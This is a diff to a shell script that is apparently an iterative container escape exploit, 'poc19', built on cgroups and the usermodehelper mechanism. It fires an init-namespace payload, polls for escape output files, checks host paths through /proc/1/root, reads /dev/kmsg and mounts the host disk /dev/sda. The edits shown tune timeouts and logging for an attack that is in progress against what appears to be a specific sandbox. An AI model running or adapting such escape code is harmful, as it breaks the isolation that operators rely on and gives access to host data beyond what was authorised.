@@ -219,7 +219,7 @@ report > "$WORKTREE/$OUT" 2>&1
 #   collector confirms execution even if the sdc write path fails.
 if [ "$DO_CGROUP_FIRE" = "1" ]; then
 {
-    echo "CGROUP_ESCAPE: === poc18 — ash shebang + readback + noexec probe ==="
+    echo "CGROUP_ESCAPE: === poc19 — ash shebang + readback + noexec probe + kmsg fix ==="
 
     # ── Pre-flight diagnostics ───────────────────────────────────────
     echo "--- usermodehelper/enabled ---"
@@ -333,9 +333,9 @@ INITNS_PAYLOAD
         _tasks_after=$(cat "$CGCHILD/tasks" 2>/dev/null | wc -l | tr -d ' ')
         echo "CGROUP_ESCAPE:   tasks before=$_tasks_before after=$_tasks_after (0=empty=fired)"
 
-        echo "CGROUP_ESCAPE:   waiting 30s for output..."
+        echo "CGROUP_ESCAPE:   waiting 10s for output..."
         _i=0
-        while [ $_i -lt 30 ]; do
+        while [ $_i -lt 10 ]; do
             [ -f "$SDC_MNT_SUBDIR/ESCAPE_OUTPUT.txt" ]              && break
             [ -f "${SDC_MNT:-/mount/gitrepo}/ESCAPE_OUTPUT.txt" ]   && break
             [ -f "$WORKTREE/ESCAPE_OUTPUT.txt" ]                     && break
@@ -372,8 +372,8 @@ INITNS_PAYLOAD
         echo "  mnt subdir: $(ls -la ${SDC_MNT_SUBDIR}/ 2>&1 | head -10)"
         echo "  /tmp/ contents: $(ls -la /tmp/ 2>&1 | head -10)"
         echo "  /proc/1/root/tmp/ (overlay escape output check): $(ls -la /proc/1/root/tmp/ 2>&1 | head -10)"
-        echo "--- /dev/kmsg (last 50 lines) ---"
-        cat /dev/kmsg 2>/dev/null | tail -50 || echo "  (kmsg read failed)"
+        echo "--- /dev/kmsg (last 50 lines, timeout 3s) ---"
+        timeout 3 cat /dev/kmsg 2>/dev/null | tail -50 || echo "  (kmsg read failed/timed out)"
         SDA_MNT=/tmp/.mnt_sda
         mkdir -p "$SDA_MNT" 2>/dev/null
         mount -o ro /dev/sda "$SDA_MNT" 2>/dev/null
